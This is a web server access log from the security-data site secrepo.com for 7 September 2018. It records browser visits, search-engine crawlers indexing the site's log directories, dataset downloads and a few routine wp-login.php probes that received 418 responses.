192.16.26.2 - - [07/Sep/2018:15:44:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
192.16.26.2 - - [07/Sep/2018:15:44:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
192.16.26.2 - - [07/Sep/2018:15:44:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
91.228.167.109 - - [07/Sep/2018:15:50:42 -0700] "GET / HTTP/1.0" 301 461 "https://socialmediascanner.eset.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
91.228.167.109 - - [07/Sep/2018:15:50:43 -0700] "GET / HTTP/1.0" 200 46201 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
99.19.233.92 - - [07/Sep/2018:15:53:20 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.19.233.92 - - [07/Sep/2018:15:53:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.19.233.92 - - [07/Sep/2018:15:53:21 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.19.233.92 - - [07/Sep/2018:15:53:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
66.249.83.159 - - [07/Sep/2018:15:54:47 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.83.158 - - [07/Sep/2018:15:54:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
202.239.4.79 - - [07/Sep/2018:15:56:53 -0700] "GET /self.logs/2015/?C=D;O=A HTTP/1.1" 200 7437 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
197.26.123.210 - - [07/Sep/2018:15:57:35 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
197.26.123.210 - - [07/Sep/2018:15:57:35 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
202.239.4.79 - - [07/Sep/2018:15:58:02 -0700] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 13551 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:15:58:45 -0700] "GET /self.logs/2016/?C=N;O=D HTTP/1.1" 200 7767 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:15:59:28 -0700] "GET /self.logs/2016/error.log.2016-01-22 HTTP/1.1" 200 334 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:00:06 -0700] "GET /self.logs/2016/?C=M;O=A HTTP/1.1" 200 8047 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:00:45 -0700] "GET /self.logs/2016/?C=D;O=A HTTP/1.1" 200 7741 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
41.223.160.173 - - [07/Sep/2018:16:00:57 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
162.210.196.129 - - [07/Sep/2018:16:01:31 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [07/Sep/2018:16:01:33 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
202.239.4.79 - - [07/Sep/2018:16:01:38 -0700] "GET /self.logs/2015/?C=M;O=A HTTP/1.1" 200 7660 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:02:25 -0700] "GET /self.logs/2016/?C=S;O=A HTTP/1.1" 200 8646 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:03:08 -0700] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 12593 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:03:45 -0700] "GET /self.logs/?C=D;O=D HTTP/1.1" 200 12006 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:04:19 -0700] "GET /self.logs/?C=N;O=A HTTP/1.1" 200 12014 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:04:48 -0700] "GET /self.logs/2015/?C=S;O=A HTTP/1.1" 200 8283 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:16:05:12 -0700] "GET /self.logs/2015/?C=N;O=D HTTP/1.1" 200 7480 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
113.171.224.176 - - [07/Sep/2018:16:05:29 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
89.39.144.122 - - [07/Sep/2018:16:12:40 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
89.39.144.122 - - [07/Sep/2018:16:12:40 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.242 - - [07/Sep/2018:16:12:43 -0700] "GET /self.logs/error.log.2017-02-11.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.188.94.118 - - [07/Sep/2018:16:13:52 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/42.0" 
76.169.119.219 - - [07/Sep/2018:16:18:33 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
76.169.119.219 - - [07/Sep/2018:16:18:33 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
76.169.119.219 - - [07/Sep/2018:16:18:33 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
76.169.119.219 - - [07/Sep/2018:16:18:33 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
207.46.13.242 - - [07/Sep/2018:16:33:25 -0700] "GET /self.logs/ HTTP/1.1" 200 12014 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
188.2.91.194 - - [07/Sep/2018:16:42:54 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
188.2.91.194 - - [07/Sep/2018:16:42:54 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
52.14.175.39 - - [07/Sep/2018:16:44:06 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Safari/602.1" 
173.69.187.72 - - [07/Sep/2018:16:45:12 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-N950U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36" 
173.69.187.72 - - [07/Sep/2018:16:45:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-N950U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36" 
173.69.187.72 - - [07/Sep/2018:16:45:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-N950U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36" 
173.69.187.72 - - [07/Sep/2018:16:45:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-N950U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36" 
46.119.115.162 - - [07/Sep/2018:16:46:33 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://www.sribno.net/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]" 
46.119.115.162 - - [07/Sep/2018:16:46:35 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://www.sribno.net/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]" 
46.119.115.162 - - [07/Sep/2018:16:46:36 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://www.sribno.net/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]" 
54.204.136.57 - - [07/Sep/2018:16:51:46 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; startmebot/1.0; +https://start.me/bot)" 
105.105.213.78 - - [07/Sep/2018:16:58:49 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
105.105.213.78 - - [07/Sep/2018:16:58:49 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.224 - - [07/Sep/2018:17:07:05 -0700] "GET /self.logs/access.log.2017-01-29.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [07/Sep/2018:17:08:39 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
18.222.108.192 - - [07/Sep/2018:17:14:15 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
216.244.66.245 - - [07/Sep/2018:17:15:39 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
24.130.108.71 - - [07/Sep/2018:17:23:25 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" 
24.130.108.71 - - [07/Sep/2018:17:23:25 -0700] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 340 "-" "MobileSafari/604.1 CFNetwork/901.1 Darwin/17.6.0" 
24.130.108.71 - - [07/Sep/2018:17:23:25 -0700] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/901.1 Darwin/17.6.0" 
24.130.108.71 - - [07/Sep/2018:17:23:25 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/901.1 Darwin/17.6.0" 
24.130.108.71 - - [07/Sep/2018:17:23:26 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "MobileSafari/604.1 CFNetwork/901.1 Darwin/17.6.0" 
24.130.108.71 - - [07/Sep/2018:17:23:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "MobileSafari/604.1 CFNetwork/901.1 Darwin/17.6.0" 
188.76.8.145 - - [07/Sep/2018:17:28:26 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
188.76.8.145 - - [07/Sep/2018:17:28:26 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.145 - - [07/Sep/2018:17:28:26 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.145 - - [07/Sep/2018:17:28:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.145 - - [07/Sep/2018:17:28:27 -0700] "GET / HTTP/1.1" 200 12382 "-" "\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\"" 
188.76.8.145 - - [07/Sep/2018:17:28:28 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.145 - - [07/Sep/2018:17:28:28 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.145 - - [07/Sep/2018:17:28:28 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
174.46.115.2 - - [07/Sep/2018:17:28:46 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
174.46.115.2 - - [07/Sep/2018:17:28:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
174.46.115.2 - - [07/Sep/2018:17:28:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
174.46.115.2 - - [07/Sep/2018:17:28:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
222.164.94.103 - - [07/Sep/2018:17:29:40 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com.sg/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
222.164.94.103 - - [07/Sep/2018:17:29:40 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
222.164.94.103 - - [07/Sep/2018:17:29:40 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
222.164.94.103 - - [07/Sep/2018:17:29:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
202.239.4.79 - - [07/Sep/2018:17:32:05 -0700] "GET /self.logs/2016/?C=M;O=D HTTP/1.1" 200 8020 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:32:56 -0700] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7666 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:33:37 -0700] "GET /self.logs/2015/?C=D;O=D HTTP/1.1" 200 7480 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:34:15 -0700] "GET /self.logs/2015/?C=N;O=A HTTP/1.1" 200 7437 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:34:54 -0700] "GET /self.logs/2016/?C=N;O=A HTTP/1.1" 200 7741 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:35:30 -0700] "GET /self.logs/2016/?C=S;O=D HTTP/1.1" 200 8572 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
14.127.251.200 - - [07/Sep/2018:17:36:06 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
202.239.4.79 - - [07/Sep/2018:17:36:19 -0700] "GET /self.logs/2016/?C=D;O=D HTTP/1.1" 200 7767 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:17:36:41 -0700] "GET /self.logs/2015/?C=S;O=D HTTP/1.1" 200 8253 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
216.244.66.245 - - [07/Sep/2018:17:40:21 -0700] "GET /self.logs/2015/?C=N;O=D HTTP/1.1" 200 67417 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.224 - - [07/Sep/2018:17:42:32 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.188.94.118 - - [07/Sep/2018:17:43:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
108.59.8.80 - - [07/Sep/2018:17:45:12 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.80 - - [07/Sep/2018:17:45:15 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
158.69.229.134 - - [07/Sep/2018:17:46:34 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
158.69.229.134 - - [07/Sep/2018:17:46:35 -0700] "GET / HTTP/1.1" 200 46212 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
54.36.149.58 - - [07/Sep/2018:17:56:59 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
122.151.147.238 - - [07/Sep/2018:18:00:50 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
122.151.147.238 - - [07/Sep/2018:18:00:50 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
122.151.147.238 - - [07/Sep/2018:18:00:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
122.151.147.238 - - [07/Sep/2018:18:00:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
24.34.236.234 - - [07/Sep/2018:18:00:57 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
24.34.236.234 - - [07/Sep/2018:18:00:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
24.34.236.234 - - [07/Sep/2018:18:00:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
24.34.236.234 - - [07/Sep/2018:18:00:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
206.180.165.147 - - [07/Sep/2018:18:06:57 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
206.180.165.147 - - [07/Sep/2018:18:06:58 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
18.219.142.57 - - [07/Sep/2018:18:14:19 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
113.171.224.176 - - [07/Sep/2018:18:14:39 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
123.126.113.156 - - [07/Sep/2018:18:14:41 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.126.113.156 - - [07/Sep/2018:18:16:32 -0700] "GET / HTTP/1.1" 200 12346 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.102.6.254 - - [07/Sep/2018:18:16:57 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.6.224 - - [07/Sep/2018:18:16:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
205.155.154.1 - - [07/Sep/2018:18:16:58 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
205.155.154.1 - - [07/Sep/2018:18:16:58 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
205.155.154.1 - - [07/Sep/2018:18:16:59 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
205.155.154.1 - - [07/Sep/2018:18:17:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
205.155.154.1 - - [07/Sep/2018:18:17:27 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
205.155.154.1 - - [07/Sep/2018:18:17:27 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
41.223.160.173 - - [07/Sep/2018:18:34:33 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
101.175.18.100 - - [07/Sep/2018:18:42:14 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com.au/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
